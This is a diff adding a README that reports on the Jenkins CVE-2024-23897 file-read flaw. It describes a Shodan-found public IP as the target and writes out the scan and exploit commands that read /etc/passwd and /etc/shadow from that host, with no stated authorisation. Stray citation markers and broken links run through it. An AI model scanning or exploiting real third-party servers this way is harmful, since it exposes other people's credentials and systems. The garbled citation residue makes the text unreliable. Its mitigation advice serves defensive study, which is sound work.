@@ -1,1 +1,55 @@
 # Bug-Hunting-
+# Jenkins Arbitrary File Read (CVE-2024-23897) Analysis Report
+
+## Overview
+[cite_start]This repository contains a detailed analysis and proof-of-concept (PoC) for **CVE-2024-23897**, an Arbitrary File Read vulnerability in Jenkins[cite: 1, 2]. [cite_start]The flaw stems from insecure CLI argument parsing, which allows unauthenticated attackers to retrieve sensitive system files from the underlying server[cite: 4, 9].
+
+## Vulnerability Details
+* [cite_start]**CVE ID:** CVE-2024-23897 [cite: 14]
+* [cite_start]**Severity:** High (CVSS 7.5) [cite: 15]
+* [cite_start]**Affected Versions:** Jenkins ≤ 2.441 [cite: 14]
+* [cite_start]**Root Cause:** The Jenkins CLI uses a parser that interprets the `@` symbol followed by a path as a file reference[cite: 61, 62]. [cite_start]Instead of sanitizing this input, Jenkins reads the file contents directly into the command arguments[cite: 63].
+
+---
+
+## Attack Lifecycle
+
+### 1. Reconnaissance
+[cite_start]Target identification was performed using **Shodan** to find internet-facing Jenkins instances[cite: 20].
+* [cite_start]**Target IP:** `123.60.57.169:8080` [cite: 12]
+* [cite_start]**Fingerprinting:** Identified via HTTP headers such as `X-Jenkins` and `X-Hudson`[cite: 22, 23, 24].
+
+### 2. Scanning & Enumeration
+[cite_start]The **Nuclei** vulnerability scanner was used to validate the exposure[cite: 32].
+* [cite_start]**Command:** `nuclei -u http://123.60.57.169:8080 -tags cve` [cite: 34]
+* [cite_start]**Result:** Confirmed unsafe CLI parsing behavior[cite: 38, 57].
+
+### 3. Exploitation
+[cite_start]A Python-based exploit was used to inject the `@` prefix into CLI arguments to bypass access controls[cite: 111, 116].
+
+**Payload Examples:**
+* **Read `/etc/passwd`:** ```bash
+    python3 exploit.py [http://123.60.57.169:8080](http://123.60.57.169:8080) @/etc/passwd
+    ```
+* **Read `/etc/shadow`:**
+    ```bash
+    python3 exploit.py [http://123.60.57.169:8080](http://123.60.57.169:8080) @/etc/shadow
+    ```
+
+### 4. Impact Analysis
+Successful exploitation allows for:
+* [cite_start]**Confidential data disclosure** (e.g., system user lists)[cite: 164].
+* [cite_start]**Credential leakage**, including Jenkins credentials, API tokens, and SSH keys[cite: 158, 159, 160].
+* [cite_start]**Full system compromise** via privilege escalation pathways[cite: 162, 166].
+
+---
+
+## Mitigation Recommendations
+To secure vulnerable instances, the following steps are recommended:
+* [cite_start]**Upgrade Jenkins:** Update to version **2.442** or later (or LTS **2.426.3** or later) to disable the vulnerable file path replacement feature[cite: 92, 93].
+* [cite_start]**Disable CLI Remoting:** Disable the CLI feature if it is not required for operations[cite: 170].
+* [cite_start]**Network Security:** Restrict access to the Jenkins interface using Firewalls or VPNs[cite: 171].
+* [cite_start]**Access Control:** Implement robust authentication and continuous monitoring[cite: 172].
+
+---
+> **Disclaimer:** This report is for educational and authorized security assessment purposes only.
